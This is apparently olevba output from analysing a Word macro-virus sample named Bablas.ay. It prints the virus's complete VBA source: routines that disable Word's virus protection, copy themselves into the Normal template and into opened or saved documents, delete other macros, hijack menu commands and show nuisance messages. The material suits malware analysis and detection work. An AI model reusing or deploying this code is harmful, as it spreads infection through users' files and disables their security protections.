olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Bablas.ay-b3ad4e8ff06a1641ce26c0b959728ef69c000a46
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Bablas.ay-b3ad4e8ff06a1641ce26c0b959728ef69c000a46 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO SANTO.bas 
in file: Virus.MSWord.Bablas.ay-b3ad4e8ff06a1641ce26c0b959728ef69c000a46 - OLE stream: 'Macros/VBA/SANTO'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'Andai saja dia tahu gue sayang banget ama dia
'mungkin gue 'nggak bakalan buat program kayak gini
'yang mungkin nyebelin
'salam manis dari Iiq

Sub ShowMessage()
    H = Time
    If (WeekDay(Date) = vbSaturday Or WeekDay(Date) = vbSunday) And Time < TimeValue("21:00:00") Then
    For i = 1 To 100
        Beep
    Next i
    H = MsgBox("dalam sekejap gue gak tau kudu gimana padahal semuanya tlah kucoba" & Chr(34) & _
    "terus terang" & Chr(34) & "," & Chr(13) & "gue gak bakalan ngelupain lo" & Chr(13) & _
    "dalam benak dalam dada dan jiwa gue yg ada hanya lo" & Chr(13) & _
    "kapan gue ketemu lo lagi" & Chr(13) & Chr(13) & "salam dari..: SANTO ANTHONIUS." & _
    Chr(13) & "(tlah kutempuh perjalanan tapi sia-sia)", vbOKOnly + vbExclamation, "Broken Hate : IIQ")
    End If
End Sub

Sub Bablas()
Attribute Bablas.VB_Description = "Macro created 10/02/99 by  Abdul Aziz"
Attribute Bablas.VB_ProcData.VB_Invoke_Func = "Normal.NewMacros.Cegat"
    Options.SaveNormalPrompt = False
    Options.VirusProtection = False
    Options.SavePropertiesPrompt = False
End Sub

Sub ToolsMacro()
    If InputBox("Masukin Kata Sandinya...", "Santo Hacker") = "IIQ NU KASEP THEA" Then Application.ShowVisualBasicEditor = True
End Sub

Sub ViewVbCode()
    ToolsMacro
End Sub

Sub FileTemplates()
    ToolsMacro
End Sub

Sub HelpAbout()
    H = MsgBox("Ochang Euy..." & Chr(13) & Chr(13) & _
    "Gue enggak mao komputer gue ERROR, but maapin gue", vbOKOnly + vbExclamation, "Santo Hacker")
End Sub

Sub ToolsOptions()
    Options.SaveNormalPrompt = True
    Options.SavePropertiesPrompt = True
    Options.VirusProtection = False
    Dialogs(wdDialogToolsOptions).Show
    Bablas
End Sub

Sub ChangeCap()
    On Error Resume Next
    Application.Caption = "Santo Hacker telah aktif di file anda "
    ActiveWindow.Caption = "(maapin iiq)"
End Sub

Sub RestoreCap()
    On Error Resume Next
    Application.Caption = "Microsoft Word"
    ActiveWindow.Caption = ActiveDocument.Name
End Sub

Sub OpenMyMacro()
    If InputBox("Masukin Kata Sandinya...", "Santo Hacker") = "IIQ NU KASEP THEA" Then Application.ShowVisualBasicEditor = True
End Sub

Sub SikatDocument()
    Dim DocOk As Boolean
    DocOk = False
    For Each Obj In ActiveDocument.VBProject.VBComponents
        If Obj.Name = "SANTO" Then DocOk = True
        If Obj.Name <> "SANTO" And Obj.Name <> "ThisDocument" Then
            Application.StatusBar = "Deleting " + Obj.Name + _
            " Macro in " + ActiveDocument.Name + "..."
            Application.OrganizerDelete Source:=ActiveDocument.FullName, _
            Name:=Obj.Name, Object:=wdOrganizerObjectProjectItems
        End If
    Next Obj
    If DocOk = False Then
        Application.StatusBar = "Copying Santo Hacker From Normal Template to " _
        + ActiveDocument.Name + "..."
        Application.OrganizerCopy Source:=NormalTemplate.FullName, _
        Destination:=ActiveDocument, Name:="SANTO", Object:=wdOrganizerObjectProjectItems
    End If
End Sub

Sub SikatTemplate()
    Dim NorOk As Boolean
    NorOk = False
    For Each Obj In NormalTemplate.VBProject.VBComponents
        If Obj.Name = "SANTO" Then NorOk = True
        If Obj.Name <> "SANTO" And Obj.Name <> "ThisDocument" Then
            Application.StatusBar = "Deleting " + Obj.Name + _
            " Macro in Normal Template..."
            Application.OrganizerDelete Source:=NormalTemplate.FullName, _
            Name:=Obj.Name, Object:=wdOrganizerObjectProjectItems
        End If
    Next Obj
    If NorOk = False Then
        Application.StatusBar = "Copying Santo Hacker From " + ActiveDocument.Name + _
        " to Normal Template..."
        Application.OrganizerCopy Source:=ActiveDocument.FullName, _
        Destination:=NormalTemplate.FullName, Name:="SANTO", Object:=wdOrganizerObjectProjectItems
        Application.DisplayRecentFiles = False
        Application.DisplayRecentFiles = True
    End If
End Sub

Sub AutoExit()
    ShowMessage
    Application.Quit
End Sub

Sub FileOpen()
    ChangeCap
    WordBasic.DisableAutoMacros True
    On Error Resume Next
    If Dialogs(wdDialogFileOpen).Show <> 0 Then
        SikatDocument
        ActiveDocument.Save
    End If
    RestoreCap
    WordBasic.DisableAutoMacros False
End Sub

Sub AutoOpen()
    Bablas
    ChangeCap
    SikatTemplate
    On Error Resume Next
    NormalTemplate.Save
    RestoreCap
End Sub

Sub AutoClose()
    'SikatDocument
End Sub

Sub FileClose()
    'AutoClose
End Sub

Sub FileSave()
    If ActiveDocument.Saved = True Then
        SikatDocument
        SikatTemplate
        On Error Resume Next
        ActiveDocument.Save
        ActiveDocument.Saved = True
    End If
End Sub

Sub Ancurin()
    C = Documents.Count
    If C <> 0 Then
        Normal.SANTO.SikatDocument
        WordBasic.DisableAutoMacros False
        On Error Resume Next
        If ActiveDocument.Name <> "Document1" Then ActiveDocument.Save
    Else: Application.OnTime Now + TimeValue("00:00:07"), "Normal.SANTO.Ancurin"
    End If
End Sub

Sub AutoExec()
    WordBasic.DisableAutoMacros False
    Bablas
    Application.OnTime Now + TimeValue("00:00:07"), "Normal.SANTO.Ancurin"
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoExec            |Runs when the Word document is opened        |
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoExit            |Runs when the Word document is closed        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
+----------+--------------------+---------------------------------------------+
